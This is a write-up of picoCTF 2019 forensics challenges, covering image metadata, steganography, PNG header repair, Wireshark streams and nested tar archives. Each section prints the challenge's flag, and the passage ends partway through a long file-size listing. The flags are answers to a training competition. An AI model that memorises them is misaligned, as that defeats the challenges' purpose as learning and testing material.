<h1><a class="header" href="#glory-of-the-garden" id="glory-of-the-garden">Glory of the Garden</a></h1>
<p>Shell:</p>
<pre><code>wget https://2019shell1.picoctf.com/static/064eaf1591900ad250736459aa2448a0/garden.jpg
strings garden.jpg | grep pico
</code></pre>
<p>flag: <code>picoCTF{more_than_m33ts_the_3y3f20F5be9}</code></p>
<h1><a class="header" href="#unzip" id="unzip">unzip</a></h1>
<pre><code class="language-bash">wget https://2019shell1.picoctf.com/static/37762a7e5774d7d6c1bc79e8e1758ef9/flag.zip
unzip flag.zip
</code></pre>
<p>This gives flag.png
<img src="forensics/1-unzip/./flag.png" alt="" />
flag: <code>picoCTF{unz1pp1ng_1s_3a5y}</code></p>
<h1><a class="header" href="#so-meta" id="so-meta">So Meta</a></h1>
<p>After downloading the image, run the <a href="forensics/2-so-meta/imagemagick.org">imagemagick</a> command <code>identify -verbose pico_img.png</code> on it. This gives 
all the metadata: </p>
<pre><code>Image: pico_img.png
  Format: PNG (Portable Network Graphics)
  Mime type: image/png
  Class: DirectClass
  Geometry: 600x600+0+0
  Units: Undefined
  Colorspace: sRGB
  Type: TrueColor
  Base type: Undefined
  Endianess: Undefined
  Depth: 8-bit
  Channel depth:
    Red: 8-bit
    Green: 8-bit
    Blue: 8-bit
  Channel statistics:
    Pixels: 360000
    Red:
      min: 0  (0)
      max: 255 (1)
      mean: 179.084 (0.70229)
      standard deviation: 98.4394 (0.386037)
      kurtosis: -1.65464
      skewness: -0.557373
      entropy: 0.262552
    Green:
      min: 0  (0)
      max: 255 (1)
      mean: 179.084 (0.702288)
      standard deviation: 98.4398 (0.386038)
      kurtosis: -1.65463
      skewness: -0.557375
      entropy: 0.262631
    Blue:
      min: 0  (0)
      max: 255 (1)
      mean: 179.084 (0.702291)
      standard deviation: 98.4393 (0.386037)
      kurtosis: -1.65464
      skewness: -0.557372
      entropy: 0.262415
  Image statistics:
    Overall:
      min: 0  (0)
      max: 255 (1)
      mean: 179.084 (0.70229)
      standard deviation: 98.4395 (0.386037)
      kurtosis: -1.65463
      skewness: -0.557375
      entropy: 0.262533
  Colors: 843
  Histogram:
        36: (  0,  0,  0) #000000 black
         1: (  1,  0,  1) #010001 srgb(1,0,1)
        [...REMOVED BECAUSE ITS TOO LONG...]
       121: (255,254,255) #FFFEFF srgb(255,254,255)
         4: (255,255,254) #FFFFFE srgb(255,255,254)
    217948: (255,255,255) #FFFFFF white
  Rendering intent: Perceptual
  Gamma: 0.454545
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Matte color: grey74
  Background color: white
  Border color: srgb(223,223,223)
  Transparent color: none
  Interlace: None
  Intensity: Undefined
  Compose: Over
  Page geometry: 600x600+0+0
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Orientation: Undefined
  Properties:
    Artist: picoCTF{s0_m3ta_368a0341}
    date:create: 2019-10-22T23:49:23+00:00
    date:modify: 2019-09-28T21:50:58+00:00
    png:IHDR.bit-depth-orig: 8
    png:IHDR.bit_depth: 8
    png:IHDR.color-type-orig: 2
    png:IHDR.color_type: 2 (Truecolor)
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 600, 600
    png:sRGB: intent=0 (Perceptual Intent)
    png:text: 2 tEXt/zTXt/iTXt chunks were found
    signature: c58b4e54359656f5ca62919f091dc1df941c504bbda927f61ad05efb88bef7f1
    Software: Adobe ImageReady
  Artifacts:
    verbose: true
  Tainted: False
  Filesize: 108795B
  Number pixels: 360000
  Pixels per second: 18.4689MP
  User time: 0.010u
  Elapsed time: 0:01.019
  Version: ImageMagick 7.0.8-68 Q16 x86_64 2019-10-07 https://imagemagick.org
</code></pre>
<p>Or you could use <code>identify pico_img.png  | pbcopy </code></p>
<p>flag: <code>picoCTF{s0_m3ta_368a0341}</code></p>
<h1><a class="header" href="#what-lies-within" id="what-lies-within">What Lies Within</a></h1>
<p>Using the <a href="https://stylesuxx.github.io/steganography/">decode here</a>, you get the flag.</p>
<p>flag: <code>picoCTF{h1d1ng_1n_th3_b1t5}</code></p>
<h1><a class="header" href="#extensions" id="extensions">extensions</a></h1>
<p>We can use <code>file</code> to find out what the file realy is </p>
<pre><code class="language-bash">$wget https://2019shell1.picoctf.com/static/45886ed4b6d5d1dc74c4944fcf4b4041/flag.txt
--2019-10-23 01:00:43--  https://2019shell1.picoctf.com/static/45886ed4b6d5d1dc74c4944fcf4b4041/flag.txt
Resolving 2019shell1.picoctf.com (2019shell1.picoctf.com)... 3.15.247.173
Connecting to 2019shell1.picoctf.com (2019shell1.picoctf.com)|3.15.247.173|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9984 (9.8K) [application/octet-stream]
Saving to: ‘flag.txt’

flag.txt                  100%[====================================&gt;]   9.75K  --.-KB/s    in 0s      

2019-10-23 01:00:44 (56.0 MB/s) - ‘flag.txt’ saved [9984/9984]

$file flag.txt 
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced

$cp flag.txt flag.png
</code></pre>
<p><img src="forensics/4-extensions/./flag.png" alt="" /></p>
<p>flag: <code>picoCTF{now_you_know_about_extensions}</code></p>
<h1><a class="header" href="#shark-on-wire-1" id="shark-on-wire-1">shark on wire 1</a></h1>
<p>Opening up the <code>.pcap</code> in <a href="https://www.wireshark.org/">wireshark</a>, it's alot.
However the hint sujested streams, so we'll look at those.</p>
<p>First click on a packet and select follow udp stream
<img src="forensics/5-shark-on-wire-1/./screanshot1.png" alt="" />
This shows the contenst of that stream
<img src="forensics/5-shark-on-wire-1/./screanshot2.png" alt="" />
Flick throught the streams to find the right one
<img src="forensics/5-shark-on-wire-1/./screanshot3.png" alt="" />
flag: <code>picoCTF{StaT31355_636f6e6e}</code></p>
<h1><a class="header" href="#whitepages" id="whitepages">WhitePages</a></h1>
<p><code>cat</code>ing the file makes it appear empty</p>
<pre><code class="language-bash">$cat whitepages.txt 
       
                     
                                                               
             
              
                                  
                                                              
                                       
                                             
                                       
                                                                 
</code></pre>
<p>However when we open it with a hex viewer like <code>xxd</code>, the information is revieled</p>
<pre><code class="language-bash">$xxd whitepages.txt | head
00000000: e280 83e2 8083 e280 83e2 8083 20e2 8083  ............ ...
00000010: 20e2 8083 e280 83e2 8083 e280 83e2 8083   ...............
00000020: 20e2 8083 e280 8320 e280 83e2 8083 e280   ...... ........
00000030: 83e2 8083 20e2 8083 e280 8320 e280 8320  .... ...... ... 
00000040: 2020 e280 83e2 8083 e280 83e2 8083 e280    ..............
00000050: 8320 20e2 8083 20e2 8083 e280 8320 e280  .  ... ...... ..
00000060: 8320 20e2 8083 e280 83e2 8083 2020 e280  .  .........  ..
00000070: 8320 20e2 8083 2020 2020 e280 8320 e280  .  ...    ... ..
00000080: 83e2 8083 e280 83e2 8083 2020 e280 8320  ..........  ... 
00000090: e280 8320 e280 8320 e280 83e2 8083 e280  ... ... ........
</code></pre>
<p>To make it more managable for python we run</p>
<pre><code class="language-bash">xxd -plain whitepages.txt | tr --delete '\n' &gt; hexvals.txt
</code></pre>
<p>The <code>-plain</code> turns off line numbering and ascii translation. The <code>tr --delete '\n'</code> removes newlines. Finaly we redirect that into <code>hexvals.txt</code>, which looks like</p>
<pre><code>e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e2808320e28083e2808320e28083202020e28083e28083e28083e28083e280832020e2808320e28083e2808320e280832020e28083e28083e280832020e280832020e2808320202020e2808320e28083e28083e28083e280832020e2808320e2808320e2808320e28083e28083e2808320e28083e28083e280832020e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e2808320e28083e2808320e2808320e2808320e28083e280832020e2808320e28083e28083e2808320e2808320e2808320e28083e28083e2808320e2808320e28083e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e2808320e2808320e2808320e2808320e28083e28083e28083e2808320e28083e2808320e28083e280832020e28083e28083e2808320e28083e2808320e28083e2808320e2808320e28083e28083e28083e280832020e28083e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e2808320e28083e2808320e28083e28083e2808320e2808320e2808320e28083e28083e28083e280832020e2808320e28083e2808320202020e2808320e2808320e28083e2808320e28083e2808320e28083e28083e2808320e28083e28083e2808320e2808320e28083e280832020e28083e2808320e28083e28083e28083e28083e28083e28083e2808320e28083e280832020e28083e28083e2808320e28083e28083e28083e28083e28083e2808320e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e280832020e2808320e28083e2808320e280832020e2808320e28083e28083e28083202020e2808320e2808320e28083e2808320e28083e2808320e28083e2808320202020e2808320e2808320e2808320e2808320e2808320e28083e28083202020e28083e2808320e28083e28083e2808320e28083e28083e28083e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e2808320e28083e2808320e28083e28083e2808320e2808320e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320202020e2808320e2808320e28083e2808320e28083e2808320e2808320e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e2808320e28083e2808320e28083e280832020e2808320e2808320e28083e280832020e28083e28083e28083e28083e28083e280832020e28083e28083e28083e28083e28083e280832020e28083e28083e28083e28083e28083e2808320e28083e28083e28083e28083e28083e2808320e28083e28083e280832020e28083e280832020e2808320202020e28083202020e28083e2808320e28083e280832020e28083e28083e2808320e28083e280832020e28083e2808320e2808320e28083202020e28083e280832020e28083e2808320e28083e28083e28083e28083e28083e2808320e28083e28083e28083e28083e2808320e28083202020e280832020e28083e280832020e28083e2808320e2808320e28083e2808320e280832020e28083e28083e28083e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e280832020e2808320e28083e2808320e28083202020e2808320e28083e28083e28083202020e2808320e28083e28083e28083202020e28083e280832020e280832020e28083e28083e2808320e28083e28083202020e2808320e2808320e28083202020e28083e2808320e28083e280832020e28083e28083202020e280832020e2808320e28083e28083e28083e28083e2808320e280832020e28083e28083e28083e2808320e28083e28083e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e28083e28083e28083e280832020e28083e28083e2808320e28083e280832020e2808320e2808320e28083e280832020e28083e2808320e28083e28083e280832020e28083e28083e2808320e28083e280832020e28083e280832020e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e2808320e28083e2808320e28083202020e28083e28083e28083e28083e280832020e2808320e28083e2808320e280832020e28083e28083e280832020e280832020e2808320202020e2808320e28083e28083e28083e280832020e2808320e2808320e2808320e28083e28083e2808320e28083e28083e280832020e28083e2808320202020e280832020e280832020e28083202020e28083e280832020e2808320202020e28083202020e2808320e28083e28083e2808320e280832020202020e280832020e28083e28083e28083e2808320e280832020e280832020e28083e28083e280832020e280832020e28083e28083e2808320e280832020202020e28083202020e28083e280832020e28083202020e28083e28083e28083e28083e280832020e28083e28083e28083e2808320e280832020e28083e28083e280832020e280832020e28083e2808320e2808320e28083202020e28083e280832020e2808320e280832020202020e280832020e28083e28083e28083e2808320e28083202020e28083e2808320e28083e280832020e28083e2808320e2808320e2808320e280832020202020e280832020e28083e28083e280832020e28083202020e28083e2808320e28083e280832020e28083e2808320e2808320e280832020e28083e28083e28083e2808320e28083202020e2808320e28083e28083e280832020e28083e2808320e2808320e280832020e28083e2808320e28083e28083e2808320e280832020202020e280832020e28083e2808320e2808320e28083202020e28083e28083e2808320e28083202020e2808320e2808320e280832020e28083e28083e28083e2808320e280832020e280832020e28083e28083e2808320e280832020202020e28083e280832020e28083e280832020e280832020e28083e28083e2808320e28083e280832020e28083e280832020e28083e28083e280832020e2808320e28083e28083e28083e280832020e28083e28083e28083e28083e280832020e28083e28083e2808320e28083e28083e28083202020e28083e28083e28083e28083e280832020e280832020e28083e28083e28083202020e28083e2808320e280832020e28083e2808320e2808320e280832020e28083e2808320e2808320e28083e28083202020e28083e2808320e28083e28083202020e28083e28083e28083e28083e280832020e2808320e28083e28083e28083e28083202020e28083e28083e28083e28083e280832020e280832020e28083e28083e280832020e280832020e28083e280832020e28083e2808320e2808320e28083e280832020e280832020e28083e28083e280832020e28083202020e280832020e28083e280832020e28083e28083e280832020e28083e280832020e28083e280832020e28083e28083e28083e28083e28083e280832020e2808320e2808320e28083e280832020e28083202020e280832020e28083e280832020e28083e28083e280832020e28083e28083e28083e28083e28083e280832020e28083e28083e28083e28083e28083e280832020e280832020e28083e280832020e28083e28083e28083e2808320e28083e28083202020e28083e2808320e28083e280832020e28083e2808320e28083e280832020202020e2808320e28083e28083e28083e2808320e2808320e28083e28083e28083e28083e2808320e28083e2808320e28083e28083e28083e2808320e28083e2808320
</code></pre>
<p>Then a simple find and replace does the job</p>
<pre><code class="language-python">from pwn import unbits

with open('./hexvals.txt', 'r') as f:
    inp = f.read()

ab = inp.replace(&quot;e28083&quot;, &quot;A&quot;).replace(&quot;20&quot;, &quot;B&quot;)
out = ab.replace(&quot;A&quot;, &quot;0&quot;).replace(&quot;B&quot;, &quot;1&quot;)

print(unbits(out).decode())
</code></pre>
<p>The AB is to avoid the zero from the <code>e28083</code> replacement interfiering with the <code>20</code>.</p>
<p>flag: <code>picoCTF{not_all_spaces_are_created_equal_3bf40b869ee984866e67f3057f006a92}</code></p>
<h1><a class="header" href="#c0rrupt" id="c0rrupt">c0rrupt</a></h1>
<p>Viewing the file in <code>xxd</code> we can guess that is's a png. Therefor you probably
want to have <a href="http://www.libpng.org/pub/png/apps/pngcheck.html"><code>pngcheck</code></a> installed.</p>
<p>However <code>pngcheck</code> doesn't even know that it's a png, because the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic number</a> is wrong. We can use <code>hexedit</code> to replace <code>8965 4e34 0d0a b0aa</code> with <code>8950 4E47 0D0A 1A0A</code>. Saving this as <code>mag_num.png</code>, we now hope that that was all.</p>
<pre><code class="language-bash">$pngcheck mag_num.png 
mag_num.png:  invalid chunk name &quot;C&quot;DR&quot; (43 22 44 52)
ERROR: mag_num.png
</code></pre>
<p>At this point, its probably worth reading <a href="https://www.w3.org/TR/PNG/">Information technology — Computer graphics and image processing — Portable Network Graphics (PNG): Functional specification. ISO/IEC 15948:2003 (E)
W3C Recommendation 10 November 2003</a>, or the PNG specification.</p>
<p>The important part is <a href="https://www.w3.org/TR/PNG/#5DataRep">section 5: Datastream structure</a>, and in paticualar the <a href="https://www.w3.org/TR/PNG/#5ChunkOrdering">chunk ordering table</a>. </p>
<p>We can tell from this that the chunk named <code>C&quot;DR</code> must be named <code>IHDR</code>. Fixing this in hexedit gives the file <code>CDR2IHDR.png</code></p>
<pre><code class="language-shell">CDR2IHDR.png  CRC error in chunk pHYs (computed 38d82c82, expected 495224f0)
ERROR: CDR2IHDR.png
</code></pre>
<p>The checksum is wrong. At this point, you can replace <code>495224f0</code> with <code>38d82c82</code>. Saving this as <code>CRC_fix.png</code>, we still get an error.</p>
<pre><code class="language-bash">$pngcheck CRC_fix.png 
CRC_fix.png  invalid chunk length (too large)
ERROR: CRC_fix.png
</code></pre>
<p>At this point look at the diagram for a chunk format
<img src="forensics/7-c0rrupt/./chunk_format.png" alt="" />
Going throuh each chunk we see that <code>IHDR</code> has lenght <code>0000 000d</code>. <code>sRGB</code> has lenght <code>00 0000 01</code>. <code>gAMA</code> has lenght <code>0000 0004</code>. <code>pHYs</code> has lenght <code>0000 0009</code>.</p>
<p>However the next chunk has name <code>ab 44 45 54</code>. This is similar to <code>49 44 41 54</code>, or <code>IDAT</code>, which does fit the <a href="https://www.w3.org/TR/PNG/#5ChunkOrdering">chunk ordering rules</a>. The problem is it's lenght is given as <code>aa aaff a5</code> or way to big.</p>
<p>To calcuate the real lenght find the next chunk, most likely <code>IDAT</code>. Their is one at offset <code>00010008</code> The first <code>IDAT</code> has ofsett <code>00000057</code>. This gives a difference of <code>FFB1</code>. Subtracting 4 bytes for the secound lenght field, 4 bytes for the first CRC and 4 bytes for the first IDAT chunktype we get a lenght of <code>0000FFA5</code></p>
<p>Now fixing the name to <code>IDAT</code> and the length to <code>0000FFA5</code>, we get <code>IDAT_len.png</code></p>
<pre><code class="language-bash">$pngcheck IDAT_len.png 
OK: IDAT_len.png (1642x1095, 24-bit RGB, non-interlaced, 96.3%).
</code></pre>
<p>The file has the flag
<img src="forensics/7-c0rrupt/./IDAT_len.png" alt="" />
flag: <code>picoCTF{c0rrupt10n_1847995}</code></p>
<h1><a class="header" href="#like1000" id="like1000">like1000</a></h1>
<p>Running <code>tar xf 1000.tar</code> (xf: e<strong>x</strong>tract <strong>f</strong>ile), we get <code>999.tar</code> which gives 
<code>998.tar</code>, and so on. You could use a bash loop, but bash is such a pain, that I find python nicer.</p>
<pre><code class="language-python">from os import system
for i in range(1000, 0, -1):
    system(&quot;tar xf {}.tar&quot;.format(i))
</code></pre>
<p>This gives flag.png
<img src="forensics/8-like1000/./flag.png" alt="" /></p>
<p>flag: <code>picoCTF{l0t5_0f_TAR5}</code></p>
<hr />
<p>Footnote:</p>
<p>Interestingly, all this taring makes the file much biger. Runing <a href="https://explainshell.com/explain?cmd=ls+%7C+grep+tar+%7C+sort+-n%7C+tac+%7C+xargs+du+-h"><code>ls | grep tar | sort -n| tac | xargs du -h</code></a> shows</p>
<pre><code>11M	1000.tar
9.8M	999.tar
9.8M	998.tar
9.8M	997.tar
9.8M	996.tar
9.8M	995.tar
9.8M	994.tar
9.8M	993.tar
9.7M	992.tar
9.7M	991.tar
9.7M	990.tar
9.7M	989.tar
9.7M	988.tar
9.7M	987.tar
9.7M	986.tar
9.7M	985.tar
9.7M	984.tar
9.7M	983.tar
9.7M	982.tar
9.6M	981.tar
9.6M	980.tar
9.6M	979.tar
9.6M	978.tar
9.6M	977.tar
9.6M	976.tar
9.6M	975.tar
9.6M	974.tar
9.6M	973.tar
9.6M	972.tar
9.5M	971.tar
9.5M	970.tar
9.5M	969.tar
9.5M	968.tar
9.5M	967.tar
9.5M	966.tar
9.5M	965.tar
9.5M	964.tar
9.5M	963.tar
9.5M	962.tar
9.4M	961.tar
9.4M	960.tar
9.4M	959.tar
9.4M	958.tar
9.4M	957.tar
9.4M	956.tar
9.4M	955.tar
9.4M	954.tar
9.4M	953.tar
9.4M	952.tar
9.3M	951.tar
9.3M	950.tar
9.3M	949.tar
9.3M	948.tar
9.3M	947.tar
9.3M	946.tar
9.3M	945.tar
9.3M	944.tar
9.3M	943.tar
9.3M	942.tar
9.2M	941.tar
9.2M	940.tar
9.2M	939.tar
9.2M	938.tar
9.2M	937.tar
9.2M	936.tar
9.2M	935.tar
9.2M	934.tar
9.2M	933.tar
9.2M	932.tar
9.2M	931.tar
9.1M	930.tar
9.1M	929.tar
9.1M	928.tar
9.1M	927.tar
9.1M	926.tar
9.1M	925.tar
9.1M	924.tar
9.1M	923.tar
9.1M	922.tar
9.1M	921.tar
9.0M	920.tar
9.0M	919.tar
9.0M	918.tar
9.0M	917.tar
9.0M	916.tar
9.0M	915.tar
9.0M	914.tar
9.0M	913.tar
9.0M	912.tar
9.0M	911.tar
8.9M	910.tar
8.9M	909.tar
8.9M	908.tar
8.9M	907.tar
8.9M	906.tar
8.9M	905.tar
8.9M	904.tar
8.9M	903.tar
8.9M	902.tar
8.9M	901.tar
8.9M	900.tar
8.8M	899.tar
8.8M	898.tar
8.8M	897.tar
8.8M	896.tar
8.8M	895.tar
8.8M	894.tar
8.8M	893.tar
8.8M	892.tar
8.8M	891.tar
8.8M	890.tar
8.7M	889.tar
8.7M	888.tar
8.7M	887.tar
8.7M	886.tar
8.7M	885.tar
8.7M	884.tar
8.7M	883.tar
8.7M	882.tar
8.7M	881.tar
8.7M	880.tar
8.6M	879.tar
8.6M	878.tar
8.6M	877.tar
8.6M	876.tar
8.6M	875.tar
8.6M	874.tar
8.6M	873.tar
8.6M	872.tar
8.6M	871.tar
8.6M	870.tar
8.5M	869.tar
8.5M	868.tar
8.5M	867.tar
8.5M	866.tar
8.5M	865.tar
8.5M	864.tar
8.5M	863.tar
8.5M	862.tar
8.5M	861.tar
8.5M	860.tar
8.4M	859.tar
8.4M	858.tar
8.4M	857.tar
8.4M	856.tar
8.4M	855.tar
8.4M	854.tar
8.4M	853.tar
8.4M	852.tar
8.4M	851.tar
8.4M	850.tar
8.4M	849.tar
8.3M	848.tar
8.3M	847.tar
8.3M	846.tar
8.3M	845.tar
8.3M	844.tar
8.3M	843.tar
8.3M	842.tar
8.3M	841.tar
8.3M	840.tar
8.3M	839.tar
8.2M	838.tar
8.2M	837.tar
8.2M	836.tar
8.2M	835.tar
8.2M	834.tar
8.2M	833.tar
8.2M	832.tar
8.2M	831.tar
8.2M	830.tar
8.2M	829.tar
8.1M	828.tar
8.1M	827.tar
8.1M	826.tar
8.1M	825.tar
8.1M	824.tar
8.1M	823.tar
8.1M	822.tar
8.1M	821.tar
8.1M	820.tar
8.1M	819.tar
8.0M	818.tar
8.0M	817.tar
8.0M	816.tar
8.0M	815.tar
8.0M	814.tar
8.0M	813.tar
8.0M	812.tar
8.0M	811.tar
8.0M	810.tar
8.0M	809.tar
8.0M	808.tar
7.9M	807.tar
7.9M	806.tar
7.9M	805.tar
7.9M	804.tar
7.9M	803.tar
7.9M	802.tar
7.9M	801.tar
7.9M	800.tar
7.9M	799.tar
7.9M	798.tar
7.8M	797.tar
7.8M	796.tar
7.8M	795.tar
7.8M	794.tar
7.8M	793.tar
7.8M	792.tar
7.8M	791.tar
7.8M	790.tar
7.8M	789.tar
7.8M	788.tar
7.7M	787.tar
7.7M	786.tar
7.7M	785.tar
7.7M	784.tar
7.7M	783.tar
7.7M	782.tar
7.7M	781.tar
7.7M	780.tar
7.7M	779.tar
7.7M	778.tar
7.6M	777.tar
7.6M	776.tar
7.6M	775.tar
7.6M	774.tar
7.6M	773.tar
7.6M	772.tar
7.6M	771.tar
7.6M	770.tar
7.6M	769.tar
7.6M	768.tar
7.5M	767.tar
7.5M	766.tar
7.5M	765.tar
7.5M	764.tar
7.5M	763.tar
7.5M	762.tar
7.5M	761.tar
7.5M	760.tar
7.5M	759.tar
7.5M	758.tar
7.5M	757.tar
7.4M	756.tar
7.4M	755.tar
7.4M	754.tar
7.4M	753.tar
7.4M	752.tar
7.4M	751.tar
7.4M	750.tar
7.4M	749.tar
7.4M	748.tar
7.4M	747.tar
7.3M	746.tar
7.3M	745.tar
7.3M	744.tar
7.3M	743.tar
7.3M	742.tar
7.3M	741.tar
7.3M	740.tar
7.3M	739.tar
7.3M	738.tar
7.3M	737.tar
7.2M	736.tar
7.2M	735.tar
7.2M	734.tar
7.2M	733.tar
7.2M	732.tar
7.2M	731.tar
7.2M	730.tar
7.2M	729.tar
7.2M	728.tar
7.2M	727.tar
7.2M	726.tar
7.1M	725.tar
7.1M	724.tar
7.1M	723.tar
7.1M	722.tar
7.1M	721.tar
7.1M	720.tar
7.1M	719.tar
7.1M	718.tar
7.1M	717.tar
7.1M	716.tar
7.0M	715.tar
7.0M	714.tar
7.0M	713.tar
7.0M	712.tar
7.0M	711.tar
7.0M	710.tar
7.0M	709.tar
7.0M	708.tar
7.0M	707.tar
7.0M	706.tar
6.9M	705.tar
6.9M	704.tar
6.9M	703.tar
6.9M	702.tar
6.9M	701.tar
6.9M	700.tar
6.9M	699.tar
6.9M	698.tar
6.9M	697.tar
6.9M	696.tar
6.8M	695.tar
6.8M	694.tar
6.8M	693.tar
6.8M	692.tar
6.8M	691.tar
6.8M	690.tar
6.8M	689.tar
6.8M	688.tar
6.8M	687.tar
6.8M	686.tar
6.7M	685.tar
6.7M	684.tar
6.7M	683.tar
6.7M	682.tar
6.7M	681.tar
6.7M	680.tar
6.7M	679.tar
6.7M	678.tar
6.7M	677.tar
6.7M	676.tar
6.7M	675.tar
6.6M	674.tar
6.6M	673.tar
6.6M	672.tar
6.6M	671.tar
6.6M	670.tar
6.6M	669.tar
6.6M	668.tar
6.6M	667.tar
6.6M	666.tar
6.6M	665.tar
6.5M	664.tar
6.5M	663.tar
6.5M	662.tar
6.5M	661.tar
6.5M	660.tar
6.5M	659.tar
6.5M	658.tar
6.5M	657.tar
6.5M	656.tar
6.5M	655.tar
6.4M	654.tar
6.4M	653.tar
6.4M	652.tar
6.4M	651.tar
6.4M	650.tar
6.4M	649.tar
6.4M	648.tar
6.4M	647.tar
6.4M	646.tar
6.4M	645.tar
6.4M	644.tar
6.3M	643.tar
6.3M	642.tar
6.3M	641.tar
6.3M	640.tar
6.3M	639.tar
6.3M	638.tar
6.3M	637.tar
6.3M	636.tar
6.3M	635.tar
6.3M	634.tar
6.2M	633.tar
6.2M	632.tar
6.2M	631.tar
6.2M	630.tar
6.2M	629.tar
6.2M	628.tar
6.2M	627.tar
6.2M	626.tar
6.2M	625.tar
6.2M	624.tar
6.1M	623.tar
6.1M	622.tar
6.1M	621.tar
6.1M	620.tar
6.1M	619.tar
6.1M	618.tar
6.1M	617.tar
6.1M	616.tar
6.1M	615.tar
6.1M	614.tar
6.0M	613.tar
6.0M	612.tar
6.0M	611.tar
6.0M	610.tar
6.0M	609.tar
6.0M	608.tar
6.0M	607.tar
6.0M	606.tar
6.0M	605.tar
6.0M	604.tar
5.9M	603.tar
5.9M	602.tar
5.9M	601.tar
5.9M	600.tar
5.9M	599.tar
5.9M	598.tar
5.9M	597.tar
5.9M	596.tar
5.9M	595.tar
5.9M	594.tar
5.9M	593.tar
5.8M	592.tar
5.8M	591.tar
5.8M	590.tar
5.8M	589.tar
5.8M	588.tar
5.8M	587.tar
5.8M	586.tar
5.8M	585.tar
5.8M	584.tar
5.8M	583.tar
5.7M	582.tar
5.7M	581.tar
5.7M	580.tar
5.7M	579.tar
5.7M	578.tar
5.7M	577.tar
5.7M	576.tar
5.7M	575.tar
5.7M	574.tar
5.7M	573.tar
5.6M	572.tar
5.6M	571.tar
5.6M	570.tar
5.6M	569.tar
5.6M	568.tar
5.6M	567.tar
5.6M	566.tar
5.6M	565.tar
5.6M	564.tar
5.6M	563.tar
5.5M	562.tar
5.5M	561.tar
5.5M	560.tar
5.5M	559.tar
5.5M	558.tar
5.5M	557.tar
5.5M	556.tar
5.5M	555.tar
5.5M	554.tar
5.5M	553.tar
5.5M	552.tar
5.4M	551.tar
5.4M	550.tar
5.4M	549.tar
5.4M	548.tar
5.4M	547.tar
5.4M	546.tar
5.4M	545.tar
5.4M	544.tar
5.4M	543.tar
5.4M	542.tar
5.3M	541.tar
5.3M	540.tar
5.3M	539.tar
5.3M	538.tar
5.3M	537.tar
5.3M	536.tar
5.3M	535.tar
5.3M	534.tar
5.3M	533.tar
5.3M	532.tar
5.2M	531.tar
5.2M	530.tar
5.2M	529.tar
5.2M	528.tar
5.2M	527.tar
5.2M	526.tar
5.2M	525.tar
5.2M	524.tar
5.2M	523.tar
5.2M	522.tar
5.1M	521.tar
5.1M	520.tar
5.1M	519.tar
5.1M	518.tar
5.1M	517.tar
5.1M	516.tar
5.1M	515.tar
5.1M	514.tar
5.1M	513.tar
5.1M	512.tar
5.0M	511.tar
5.0M	510.tar
5.0M	509.tar
5.0M	508.tar
5.0M	507.tar
5.0M	506.tar
5.0M	505.tar
5.0M	504.tar
5.0M	503.tar
5.0M	502.tar
5.0M	501.tar
4.9M	500.tar
4.9M	499.tar
4.9M	498.tar
4.9M	497.tar
4.9M	496.tar
4.9M	495.tar
4.9M	494.tar
4.9M	493.tar
4.9M	492.tar
4.9M	491.tar
4.8M	490.tar
4.8M	489.tar
4.8M	488.tar
4.8M	487.tar
4.8M	486.tar
4.8M	485.tar
4.8M	484.tar
4.8M	483.tar
4.8M	482.tar
4.8M	481.tar
4.7M	480.tar
4.7M	479.tar
4.7M	478.tar
4.7M	477.tar
4.7M	476.tar
4.7M	475.tar
4.7M	474.tar
4.7M	473.tar
4.7M	472.tar
4.7M	471.tar
4.7M	470.tar
4.6M	469.tar
4.6M	468.tar
4.6M	467.tar
4.6M	466.tar
4.6M	465.tar
4.6M	464.tar
4.6M	463.tar
4.6M	462.tar
4.6M	461.tar
4.6M	460.tar
4.5M	459.tar
4.5M	458.tar
4.5M	457.tar
4.5M	456.tar
4.5M	455.tar
4.5M	454.tar
4.5M	453.tar
4.5M	452.tar
4.5M	451.tar
4.5M	450.tar
4.4M	449.tar
4.4M	448.tar
4.4M	447.tar
4.4M	446.tar
4.4M	445.tar
4.4M	444.tar
4.4M	443.tar
4.4M	442.tar
4.4M	441.tar
4.4M	440.tar
4.3M	439.tar
4.3M	438.tar
4.3M	437.tar
4.3M	436.tar
4.3M	435.tar
4.3M	434.tar
4.3M	433.tar
4.3M	432.tar
4.3M	431.tar
4.3M	430.tar
4.2M	429.tar
4.2M	428.tar
4.2M	427.tar
4.2M	426.tar
4.2M	425.tar
4.2M	424.tar
4.2M	423.tar
4.2M	422.tar
4.2M	421.tar
4.2M	420.tar
4.2M	419.tar
4.1M	418.tar
4.1M	417.tar
4.1M	416.tar
4.1M	415.tar
4.1M	414.tar
4.1M	413.tar
4.1M	412.tar
4.1M	411.tar
4.1M	410.tar
4.1M	409.tar
4.0M	408.tar
4.0M	407.tar
4.0M	406.tar
4.0M	405.tar
4.0M	404.tar
4.0M	403.tar
4.0M	402.tar
4.0M	401.tar
4.0M	400.tar
4.0M	399.tar
3.9M	398.tar
3.9M	397.tar
3.9M	396.tar
3.9M	395.tar
3.9M	394.tar
3.9M	393.tar
3.9M	392.tar
3.9M	391.tar
3.9M	390.tar
3.9M	389.tar
3.9M	388.tar
3.8M	387.tar
3.8M	386.tar
3.8M	385.tar
3.8M	384.tar
3.8M	383.tar
3.8M	382.tar
3.8M	381.tar
3.8M	380.tar
